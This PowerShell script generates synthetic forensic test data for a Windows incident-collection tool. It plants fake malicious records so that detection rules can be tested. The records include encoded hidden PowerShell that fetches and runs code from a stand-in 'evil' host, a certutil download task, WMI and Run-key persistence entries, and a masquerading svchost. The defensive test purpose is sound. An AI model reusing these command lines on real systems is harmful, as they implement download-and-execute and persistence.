# Generates a synthetic .hawk session covering every typed artifact, with
# planted suspicious entries to exercise the MRI rules end-to-end.
# Usage: powershell -File New-TestSession.ps1
$ErrorActionPreference = 'Stop'
$root = Join-Path $PSScriptRoot 'session_v2'
if (Test-Path $root) { Remove-Item $root -Recurse -Force }
New-Item -ItemType Directory -Force "$root\artifacts" | Out-Null

function Envelope($type, $records) {
    [ordered]@{
        schemaVersion = '1.0'; artifactType = $type; host = 'TEST-HOST'
        collectedAtUtc = '2026-06-01T10:00:00Z'; records = $records
    } | ConvertTo-Json -Depth 8 | Out-File "$root\artifacts\$type.json" -Encoding utf8
}

# --- manifest -----------------------------------------------------------------
[ordered]@{
    schemaVersion = '1.0'
    tool = @{ name = 'HawkCollector'; version = '2.0.0' }
    case = [ordered]@{ caseNumber = 'TEST-002'; investigator = 'unit-test'
        collectionStartUtc = '2026-06-01T10:00:00Z'; collectionEndUtc = '2026-06-01T10:05:00Z' }
    host = [ordered]@{ hostname = 'TEST-HOST'; domain = 'TESTLAB'
        os = @{ caption = 'Microsoft Windows 11 Pro'; version = '10.0.26100'; build = 26100 }
        role = 'workstation'; timezone = 'UTC'; arch = 'x64' }
    preset = 'standard'
    modules = @(); rawArtifacts = @()
} | ConvertTo-Json -Depth 6 | Out-File "$root\manifest.json" -Encoding utf8

# --- processes: trusted MS signer, masquerading svchost, encoded PS ------------
Envelope 'processes' @(
    [ordered]@{ pid = 4;    ppid = 0;    name = 'System';      path = $null; commandLine = $null
        user = 'SYSTEM'; sessionId = 0; startTimeUtc = '2026-05-30T08:00:00Z'
        sha256 = $null; md5 = $null; signatureStatus = 'Unknown'; signer = $null
        parentName = $null; parentPath = $null },
    [ordered]@{ pid = 900;  ppid = 600;  name = 'svchost.exe'; path = 'C:\Windows\System32\svchost.exe'
        commandLine = 'C:\Windows\System32\svchost.exe -k netsvcs'; user = 'SYSTEM'; sessionId = 0
        startTimeUtc = '2026-05-30T08:00:05Z'; sha256 = 'AA01'; md5 = 'BB01'
        signatureStatus = 'Valid'; signer = 'CN=Microsoft Windows, O=Microsoft Corporation'
        parentName = 'services.exe'; parentPath = 'C:\Windows\System32\services.exe' },
    [ordered]@{ pid = 6666; ppid = 1111; name = 'svchost.exe'; path = 'C:\Users\bob\AppData\Local\Temp\svchost.exe'
        commandLine = 'C:\Users\bob\AppData\Local\Temp\svchost.exe'; user = 'TESTLAB\bob'; sessionId = 1
        startTimeUtc = '2026-06-01T09:45:00Z'; sha256 = 'AA02'; md5 = 'BB02'
        signatureStatus = 'NotSigned'; signer = $null
        parentName = 'cmd.exe'; parentPath = 'C:\Windows\System32\cmd.exe' },
    [ordered]@{ pid = 7777; ppid = 5555; name = 'powershell.exe'; path = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
        commandLine = 'powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AC4ALgAuAA=='
        user = 'TESTLAB\bob'; sessionId = 1; startTimeUtc = '2026-06-01T09:46:10Z'
        sha256 = 'AA03'; md5 = 'BB03'; signatureStatus = 'Valid'
        signer = 'CN=Microsoft Windows, O=Microsoft Corporation'
        parentName = 'winword.exe'; parentPath = 'C:\Program Files\Microsoft Office\winword.exe' }
)

# --- services: clean, unquoted path, shell service, unsigned-appdata -----------
Envelope 'services' @(
    [ordered]@{ name = 'Spooler'; displayName = 'Print Spooler'; state = 'Running'; startMode = 'Auto'
        account = 'LocalSystem'; pathName = '"C:\Windows\System32\spoolsv.exe"'
        binaryPath = 'C:\Windows\System32\spoolsv.exe'; sha256 = 'CC01'; md5 = 'DD01'
        signatureStatus = 'Valid'; signer = 'CN=Microsoft Windows, O=Microsoft Corporation'
        serviceDll = $null; serviceDllMd5 = $null; serviceDllSha256 = $null
        serviceDllSigner = $null; serviceDllSigStatus = $null
        serviceType = 'Own Process'; description = 'Spooler'; processId = 2000 },
    [ordered]@{ name = 'UpdaterSvc'; displayName = 'Updater Service'; state = 'Running'; startMode = 'Auto'
        account = 'LocalSystem'; pathName = 'C:\Program Files\Acme Soft\update svc\updater.exe -run'
        binaryPath = 'C:\Program Files\Acme Soft\update svc\updater.exe'; sha256 = 'CC02'; md5 = 'DD02'
        signatureStatus = 'NotSigned'; signer = $null
        serviceDll = $null; serviceDllMd5 = $null; serviceDllSha256 = $null
        serviceDllSigner = $null; serviceDllSigStatus = $null
        serviceType = 'Own Process'; description = $null; processId = 2400 },
    [ordered]@{ name = 'WinHelper'; displayName = 'Windows Helper'; state = 'Stopped'; startMode = 'Auto'
        account = 'LocalSystem'
        pathName = 'cmd.exe /c powershell -nop -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwAA=='
        binaryPath = $null; sha256 = $null; md5 = $null; signatureStatus = 'Unknown'; signer = $null
        serviceDll = $null; serviceDllMd5 = $null; serviceDllSha256 = $null
        serviceDllSigner = $null; serviceDllSigStatus = $null
        serviceType = 'Own Process'; description = $null; processId = $null }
)

# --- run keys: clean signed, encoded PS, missing target -------------------------
Envelope 'registry_runkeys' @(
    [ordered]@{ keyPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'; userSid = $null
        valueName = 'SecurityHealth'; command = 'C:\Windows\System32\SecurityHealthSystray.exe'
        binaryPath = 'C:\Windows\System32\SecurityHealthSystray.exe'; sha256 = 'EE01'; md5 = 'FF01'
        signatureStatus = 'Valid'; signer = 'CN=Microsoft Windows, O=Microsoft Corporation' },
    [ordered]@{ keyPath = 'HKU:\<sid>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'; userSid = 'S-1-5-21-1-2-3-1001'
        valueName = 'OneDriveUpdate'
        command = 'powershell.exe -w hidden -enc aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAApAA=='
        binaryPath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; sha256 = 'EE02'; md5 = 'FF02'
        signatureStatus = 'Valid'; signer = 'CN=Microsoft Windows, O=Microsoft Corporation' },
    [ordered]@{ keyPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'; userSid = $null
        valueName = 'DriverBooster'; command = 'C:\Users\bob\AppData\Roaming\drvbst.exe /silent'
        binaryPath = $null; sha256 = $null; md5 = $null; signatureStatus = 'Unknown'; signer = $null }
)

# --- scheduled tasks: clean, certutil download task ------------------------------
Envelope 'scheduled_tasks' @(
    [ordered]@{ taskName = 'OneDrive Standalone Update'; taskPath = '\'; state = 'Ready'
        author = 'Microsoft'; runAs = 'bob'; runLevel = 'Limited'
        execute = '%localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe'; arguments = $null
        workingDirectory = $null; binaryPath = 'C:\Users\bob\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe'
        sha256 = 'GG01'; md5 = 'HH01'; signatureStatus = 'Valid'
        signer = 'CN=Microsoft Corporation, O=Microsoft Corporation'
        lastRunTimeUtc = '2026-05-31T18:00:00Z'; nextRunTimeUtc = '2026-06-02T18:00:00Z'
        lastTaskResult = 0; triggers = 'MSFT_TaskDailyTrigger' },
    [ordered]@{ taskName = 'SysUpdate'; taskPath = '\Microsoft\Windows\Maintenance\'; state = 'Ready'
        author = $null; runAs = 'SYSTEM'; runLevel = 'Highest'
        execute = 'certutil.exe'; arguments = '-urlcache -split -f http://203.0.113.7/p.bin C:\ProgramData\p.bin'
        workingDirectory = $null; binaryPath = 'C:\Windows\System32\certutil.exe'
        sha256 = 'GG02'; md5 = 'HH02'; signatureStatus = 'Valid'
        signer = 'CN=Microsoft Windows, O=Microsoft Corporation'
        lastRunTimeUtc = '2026-06-01T09:30:00Z'; nextRunTimeUtc = $null
        lastTaskResult = 0; triggers = 'MSFT_TaskLogonTrigger' }
)

# --- startup folder: unsigned exe dropped recently --------------------------------
Envelope 'startup_folder' @(
    [ordered]@{ user = 'bob'
        itemPath = 'C:\Users\bob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\sync.lnk'
        itemName = 'sync.lnk'; target = 'C:\Users\bob\AppData\Local\Temp\sync.exe'; targetArguments = '/q'
        sha256 = 'II01'; md5 = 'JJ01'; signatureStatus = 'NotSigned'; signer = $null
        createdUtc = '2026-06-01T09:40:00Z'; modifiedUtc = '2026-06-01T09:40:00Z' }
)

# --- WMI persistence: filter + cmdline consumer + script consumer + binding ------
Envelope 'wmi_persistence' @(
    [ordered]@{ objectType = 'EventFilter'; name = 'BVTFilter'
        query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
        queryLanguage = 'WQL'; eventNamespace = 'root\cimv2'
        consumerType = $null; destination = $null; filterRef = $null; consumerRef = $null },
    [ordered]@{ objectType = 'CommandLineEventConsumer'; name = 'BVTConsumer'
        query = $null; queryLanguage = $null; eventNamespace = $null
        consumerType = 'CommandLine'
        destination = 'powershell.exe -nop -w hidden -c "iex(gc C:\ProgramData\x.ps1 -raw)"'
        filterRef = $null; consumerRef = $null },
    [ordered]@{ objectType = 'ActiveScriptEventConsumer'; name = 'POSHSPY-like'
        query = $null; queryLanguage = $null; eventNamespace = $null
        consumerType = 'ActiveScript(VBScript)'
        destination = 'CreateObject("WScript.Shell").Run "calc.exe"'
        filterRef = $null; consumerRef = $null },
    [ordered]@{ objectType = 'FilterToConsumerBinding'; name = $null
        query = $null; queryLanguage = $null; eventNamespace = $null
        consumerType = $null; destination = $null
        filterRef = '__EventFilter.Name="BVTFilter"'; consumerRef = 'CommandLineEventConsumer.Name="BVTConsumer"' }
)

# --- network: external C2-like from the suspicious process ------------------------
Envelope 'network_connections' @(
    [ordered]@{ protocol = 'TCP'; localAddress = '10.0.0.5'; localPort = 49233
        remoteAddress = '203.0.113.7'; remotePort = 443; state = 'Established'
        pid = 6666; processName = 'svchost.exe'; processPath = 'C:\Users\bob\AppData\Local\Temp\svchost.exe'
        creationTimeUtc = '2026-06-01T09:45:30Z' },
    [ordered]@{ protocol = 'TCP'; localAddress = '10.0.0.5'; localPort = 49300
        remoteAddress = '10.0.0.10'; remotePort = 445; state = 'Established'
        pid = 4; processName = 'System'; processPath = $null
        creationTimeUtc = '2026-06-01T08:00:00Z' },
    [ordered]@{ protocol = 'UDP'; localAddress = '0.0.0.0'; localPort = 5353
        remoteAddress = $null; remotePort = $null; state = 'Stateless'
        pid = 1500; processName = 'svchost.exe'; processPath = 'C:\Windows\System32\svchost.exe'
        creationTimeUtc = $null }
)

# --- generic artifacts (no typed table) -------------------------------------------
Envelope 'logon_sessions' @(
    [ordered]@{ logonId = '0x3e7'; user = 'TESTLAB\SYSTEM'; logonTypeCode = 0
        logonType = 'System'; authenticationPackage = 'NTLM'; startTimeUtc = '2026-05-30T08:00:00Z' },
    [ordered]@{ logonId = '0x9af2'; user = 'TESTLAB\bob'; logonTypeCode = 10
        logonType = 'RemoteInteractive'; authenticationPackage = 'NTLM'; startTimeUtc = '2026-06-01T09:30:00Z' }
)
Envelope 'dns_cache' @(
    [ordered]@{ name = 'evil-c2.example.net'; recordType = 'A'; data = '203.0.113.7'; ttl = 300 },
    [ordered]@{ name = 'www.microsoft.com'; recordType = 'A'; data = '23.0.0.1'; ttl = 3600 }
)

# --- hashes + zip ------------------------------------------------------------------
$files = Get-ChildItem $root -Recurse -File | ForEach-Object {
    [ordered]@{ path = $_.FullName.Substring($root.Length + 1) -replace '\\','/'
                sha256 = (Get-FileHash $_.FullName -Algorithm SHA256).Hash }
}
@{ schemaVersion = '1.0'; files = $files } | ConvertTo-Json -Depth 4 |
    Out-File "$root\hashes.json" -Encoding utf8

$hawk = Join-Path $PSScriptRoot 'TEST-002_TEST-HOST.hawk'
if (Test-Path $hawk) { Remove-Item $hawk -Force }
Add-Type -AssemblyName System.IO.Compression.FileSystem
[IO.Compression.ZipFile]::CreateFromDirectory($root, $hawk, 'Optimal', $false)
Remove-Item $root -Recurse -Force
Write-Host "[+] $hawk"
